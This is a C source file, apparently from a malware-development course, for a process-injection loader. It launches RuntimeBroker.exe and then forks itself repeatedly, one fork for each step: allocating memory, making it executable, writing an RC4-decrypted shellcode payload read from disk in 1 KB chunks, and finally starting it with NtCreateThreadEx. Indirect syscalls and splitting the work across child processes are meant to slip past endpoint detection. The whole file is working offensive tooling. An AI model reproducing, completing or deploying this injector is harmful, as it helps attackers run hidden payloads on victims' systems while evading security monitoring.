// @NUL0x4C | @mrd0x : MalDevAcademy
#include <Windows.h>
#include <stdio.h>
#include "Common.h"
#include <shlobj.h>

#pragma comment (lib, "shell32.lib")


#define BUFFER_SIZE 2048

NT_API	g_Nt = { 0 };
NTSTATUS    STATUS = 0x00;


//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------


VOID AddWin32uToIat() {

	WCHAR szPath[MAX_PATH] = { 0 };
	SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}


//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------


BOOL CreateProcessViaWinAPIsA(IN LPCSTR cProcessImgNameAndParms, OUT PPROCESS_INFORMATION pProcessInfo) {

	if (!cProcessImgNameAndParms || !pProcessInfo)
		return FALSE;

	STARTUPINFO		StartupInfo = { .cb = sizeof(STARTUPINFO) };
	DWORD			dwCreationFlags = NORMAL_PRIORITY_CLASS;
	PCHAR			pcDuplicateStr = NULL,
		pcLastSlash = NULL;

	RtlSecureZeroMemory(pProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!(pcDuplicateStr = _strdup(cProcessImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%s\" - %d\n", cProcessImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pcLastSlash = strrchr(pcDuplicateStr, '\\'))
		*pcLastSlash = '\0';

	if (!CreateProcessA(NULL, cProcessImgNameAndParms, NULL, NULL, FALSE, dwCreationFlags, NULL, pcDuplicateStr, &StartupInfo, pProcessInfo)) {
		printf("[!] CreateProcessA [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}


_END_OF_FUNC:
	if (pProcessInfo->hThread)
		CloseHandle(pProcessInfo->hThread);
	if (pcDuplicateStr)
		free(pcDuplicateStr);
	return pProcessInfo->hProcess ? TRUE : FALSE;
}

//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------


BOOL Fork(IN LPCSTR cProcessParms) {

	if (!cProcessParms)
		return FALSE;

	STARTUPINFO			StartupInfo = { .cb = sizeof(STARTUPINFO) };
	PROCESS_INFORMATION		ProcessInfo = { 0x00 };
	CHAR				cFileName[MAX_PATH] = { 0x00 };
	CHAR				cProcImgNameAndParms[MAX_PATH * 2] = { 0x00 };
	PCHAR				pcDuplicateStr = NULL,
		pcLastSlash = NULL;
	BOOL				bResult = FALSE;

	RtlSecureZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

	if (GetModuleFileNameA(NULL, cFileName, sizeof(cFileName)) == (DWORD)-1) {
		printf("[!] GetModuleFileNameA Failed with Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	sprintf_s(cProcImgNameAndParms, sizeof(cProcImgNameAndParms), "%s %s", cFileName, cProcessParms);

	if (!(pcDuplicateStr = _strdup(cProcImgNameAndParms))) {
		printf("[!] Failed To Duplicate \"%s\" - %d\n", cProcImgNameAndParms, __LINE__);
		goto _END_OF_FUNC;
	}

	if (pcLastSlash = strrchr(pcDuplicateStr, '\\'))
		*pcLastSlash = '\0';

	if (!CreateProcessA(NULL, cProcImgNameAndParms, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, pcDuplicateStr, &StartupInfo, &ProcessInfo)) {
		printf("[!] CreateProcessA [%d] Failed with Error: %d \n", __LINE__, GetLastError());
		goto _END_OF_FUNC;
	}

	// 0.5s
	WaitForSingleObject(ProcessInfo.hProcess, 500);

	bResult = TRUE;

_END_OF_FUNC:
	if (pcDuplicateStr)
		free(pcDuplicateStr);
	if (ProcessInfo.hProcess)
		CloseHandle(ProcessInfo.hProcess);
	if (ProcessInfo.hThread)
		CloseHandle(ProcessInfo.hThread);
	return bResult;
}

//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------


ULONG_PTR ConvertStringToPtr(IN CONST CHAR* String) {

	unsigned long long ullHexValue = 0x00;

	if (!sscanf_s(String, "%llx", &ullHexValue)) {
		printf("[!] Failed To Convert \"%s\" Into An Ineger\n", String);
		return NULL;
	}

	return (ULONG_PTR)ullHexValue;
}

//----------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;
} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(struct USTRING* Buffer, struct USTRING* Key);

BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN PBYTE pRc4Key, IN DWORD dwRc4KeySize) {

	NTSTATUS			STATUS = NULL;
	fnSystemFunction032 		SystemFunction032 = NULL;
	USTRING				Buffer = { .Buffer = pShellcode,	.Length = dwShellcodeSize,	.MaximumLength = dwShellcodeSize };
	USTRING				Key = { .Buffer = pRc4Key,		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize };

	if (!(SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryW(L"Advapi32"), "SystemFunction032"))) {
		printf("[!] GetProcAddress Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	if ((STATUS = SystemFunction032(&Buffer, &Key)) != 0x0) {
		printf("[!] SystemFunction032 Failed With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------
// Replace With Your ChristmasPayloadEnc.exe Output

unsigned char Rc4Key[16];

/*
	Size of 'Rc4EncData' is multiple of 1024 - ChristmasPayloadEnc/main.c
*/

// Payload
unsigned char Rc4EncData[BUFFER_SIZE];


int LoadStuffFromDisk(const char* fileName, void* data) {
	FILE* file;
	long file_size;
	//char buffer[2048];

	// Open the binary file in binary mode using fopen_s
	if (fopen_s(&file, fileName, "rb") != 0) {
		perror("[-] Error opening file");
		return 1;
	}

	// Determine the file size
	fseek(file, 0, SEEK_END);
	file_size = ftell(file);
	fseek(file, 0, SEEK_SET);

	// Read the file into memory, up to BUFFER_SIZE bytes
	fread(data, 1, BUFFER_SIZE, file);

	// Close the file
	fclose(file);

	// Process the data in the buffer as needed

	return 0;
}


//---------------------------------------------------------------------------------------------------------------------------------
//---------------------------------------------------------------------------------------------------------------------------------


int main(int argc, char* argv[]) {

	CHAR					cTargetProcName[MAX_PATH] = "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding";
	CHAR					cLocalProcParms[MAX_PATH] = { 0x00 };
	PROCESS_INFORMATION			ProcessInfo = { 0x00 };
	HANDLE					hTargetProcess = NULL,
		hThread = NULL;
	ULONG_PTR				uBaseAddress = NULL;
	DWORD					dwOldProtection = 0x00,
		dwThreadId = 0x00;
	SIZE_T					sNumberOfBytesWritten = NULL;
	SIZE_T				pRc4Encrypt = sizeof(Rc4EncData);

	SIZE_T				sizeOfBuffer = 1024;

	PVOID				pRc4EncData = &Rc4EncData;

	DWORD				dwFileLength = 0x00;


	AddWin32uToIat();

	// Initialize indirect syscalls structure
	if (!InitIndirectSyscalls(&g_Nt)) {
		return -1;
	}

	LoadStuffFromDisk("shellcodeData.bin", Rc4EncData);
	LoadStuffFromDisk("shellcodeKey.bin", Rc4Key);

	if (argc == 1) {

		// Create Target Process

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		if (!CreateProcessViaWinAPIsA(cTargetProcName, &ProcessInfo))
			return -1;

		if (!(hTargetProcess = ProcessInfo.hProcess))
			return -1;

		// Duplicate Handle To Child Processes
		if (!SetHandleInformation(hTargetProcess, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT)) {
			printf("[!] SetHandleInformation Failed with Error: %d \n", GetLastError());
			return -1;
		}

		printf("[%d] Created Target Process: %d [%p] \n", argc, ProcessInfo.dwProcessId, hTargetProcess);

		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%p", hTargetProcess);

		// Fork With Target Process Handle
		// Christmas.exe 00000000000000DA
		if (!Fork(cLocalProcParms))
			return -1;
	}

	if (argc == 2) {

		// Allocate Memory

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);
		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);

		//printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
		if ((STATUS = RunSyscall((HANDLE)hTargetProcess, &uBaseAddress, 0, &pRc4Encrypt, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || uBaseAddress == NULL) {
			printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n", STATUS);
			return -1;
		}




		/*if (!(uBaseAddress = VirtualAllocEx((HANDLE)hTargetProcess, NULL, sizeof(Rc4EncData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
			printf("[!] VirtualAllocEx Failed with Error: %d \n", GetLastError());
			return -1;
		}*/



		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p", argv[1], (PVOID)uBaseAddress);

		// Fork With Target Process Handle & Base Address
		// Christmas.exe 00000000000000DA 00007FF9C37EB78F
		if (!Fork(cLocalProcParms))
			return -1;
	}

	if (argc == 3) {

		// RWX

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);

		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);




		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if ((STATUS = RunSyscall(hTargetProcess, &uBaseAddress, &pRc4Encrypt, PAGE_EXECUTE_READWRITE, &dwOldProtection)) != 0x00) {
			printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
			return -1;
		}

		/*if (!VirtualProtectEx(hTargetProcess, uBaseAddress, sizeof(Rc4EncData), PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
			printf("[!] VirtualProtectEx Failed with Error: %d \n", GetLastError());
			return -1;
		}*/

		printf("[%d] Memory Region Is Now RWX \n", argc);

		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d", argv[1], (PVOID)uBaseAddress, 0x100);

		// Fork With Target Process Handle & Base Address & dummy arg
		// Christmas.exe 00000000000000DA 00007FF9C37EB78F 256
		if (!Fork(cLocalProcParms))
			return -1;
	}

	if (argc == 4) {

		// Initial Write Process	

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);

		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);

		DWORD		dwWriteProcesses = sizeof(Rc4EncData) / 1024,
			dwCurrentProcess = 0x00;

		if (!Rc4EncryptionViaSystemFunc032(Rc4EncData, sizeof(Rc4EncData), Rc4Key, sizeof(Rc4Key))) {
			printf("[!] Failed To Decrypt Payload: %d\n", __LINE__);
			return -1;
		}

		//printf("[+] Syscall Number Of NtWriteVirtualMemory Is : 0x%0.2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.NtWriteVirtualMemory.dwSSn, g_Nt.NtWriteVirtualMemory.pSyscallInstAddress);
		SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
		if ((STATUS = RunSyscall(hTargetProcess, uBaseAddress, Rc4EncData, 1024, &sNumberOfBytesWritten)) || 1024 != sNumberOfBytesWritten) {
			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
			getchar();
			return FALSE;
		}

		// Rc4EncData is now plaintext payload

		//printf("[+] --------- Allocated Memory At: 0x%p \n", argc, (PVOID)uBaseAddress);

		/*if (!WriteProcessMemory(hTargetProcess, uBaseAddress, Rc4EncData, 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
			printf("[!] WriteProcessMemory Failed with Error: %d \n", GetLastError());
			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
			return -1;
		}*/

		// Increment Write Process Number
		dwCurrentProcess++;

		sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d %d", argv[1], (PVOID)uBaseAddress, 0x100, dwCurrentProcess);

		// Fork With Target Process Handle & Base Address & dummy arg & current process number
		// Christmas.exe 00000000000000DA 00007FF9C37EB78F 256 [dwCurrentProcess]
		if (!Fork(cLocalProcParms))
			return -1;
	}


	if (argc == 5) {

		// Inject (N times)

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);

		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);

		DWORD		dwWriteProcesses = sizeof(Rc4EncData) / 1024,
			dwCurrentProcess = atoi(argv[4]);

		printf("[%d] Current Process Number: %d \n", argc, dwCurrentProcess);

		if (!Rc4EncryptionViaSystemFunc032(Rc4EncData, sizeof(Rc4EncData), Rc4Key, sizeof(Rc4Key))) {
			printf("[!] Failed To Decrypt Payload: %d\n", __LINE__);
			return -1;
		}

		// Rc4EncData is now plaintext payload

		SET_SYSCALL(g_Nt.NtWriteVirtualMemory);
		if (STATUS = RunSyscall(hTargetProcess, (uBaseAddress + (dwCurrentProcess * 1024)), (Rc4EncData + (dwCurrentProcess * 1024)), 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
			printf("[!] NtWriteVirtualMemory Failed With Status : 0x%0.8X\n", STATUS);
			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
			getchar();
			return FALSE;
		}

		/*if (!WriteProcessMemory(hTargetProcess, (uBaseAddress + (dwCurrentProcess * 1024)), (Rc4EncData + (dwCurrentProcess * 1024)), 1024, &sNumberOfBytesWritten) || 1024 != sNumberOfBytesWritten) {
			printf("[!] WriteProcessMemory Failed with Error: %d \n", GetLastError());
			printf("[i] Wrote %d of %d Bytes \n", (int)sNumberOfBytesWritten, 1024);
			return -1;
		}*/

		// Increment Write Process Number
		dwCurrentProcess++;

		if (dwCurrentProcess == dwWriteProcesses) {
			// Fork With Target Process Handle & Base Address & dummy arg x3
			// Christmas.exe 00000000000000DA 00007FF9C37EB78F 256 256 256
			printf("[%d] Payload Is Written To Target Process \n", argc);
			sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d %d %d", argv[1], (PVOID)uBaseAddress, 0x100, 0x100, 0x100);	// argc == 6 -> execute
		}
		else
			// Fork With Target Process Handle & Base Address & dummy arg & current process number
			// Christmas.exe 00000000000000DA 00007FF9C37EB78F 256 [dwCurrentProcess]
			sprintf_s(cLocalProcParms, sizeof(cLocalProcParms), "%s %p %d %d", argv[1], (PVOID)uBaseAddress, 0x100, dwCurrentProcess);	// argc == 5 (again)

		Sleep(100); // x80 (payload size / 1024) * 100ms = 8s

		if (!Fork(cLocalProcParms))
			return -1;
	}


	if (argc == 6) {

		// Execute

		printf("\n[%d] Current PID: %d \n", argc, GetCurrentProcessId());

		uBaseAddress = (ULONG_PTR)ConvertStringToPtr(argv[2]);
		hTargetProcess = (HANDLE)ConvertStringToPtr(argv[1]);

		printf("[%d] Fetched Target Process Handle: %p \n", argc, hTargetProcess);
		printf("[%d] Fetched Allocated Base Address: 0x%p \n", argc, (PVOID)uBaseAddress);

		printf("[%d] Sleeping ... ", argc);
		Sleep(1000 * 5); // 5s
		printf("[+] DONE \n");

		SET_SYSCALL(g_Nt.NtCreateThreadEx);
		if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, uBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
			return FALSE;
		}

		/*if (!(hThread = CreateRemoteThread(hTargetProcess, NULL, 0x00, uBaseAddress, NULL, 0x00, &dwThreadId))) {
			printf("[!] CreateRemoteThread Failed with Error: %d \n", GetLastError());
			return -1;
		}
		*/

		printf("[%d] Payload Is Executed Using A Thread Of ID: %d \n", argc, dwThreadId);
		printf("[%d] Target PID: %d \n", argc, GetProcessId(hTargetProcess));
	}

	// Cleanup
	if (hThread)
		CloseHandle(hThread);
	if (hTargetProcess)
		CloseHandle(hTargetProcess);

	return 0;
}

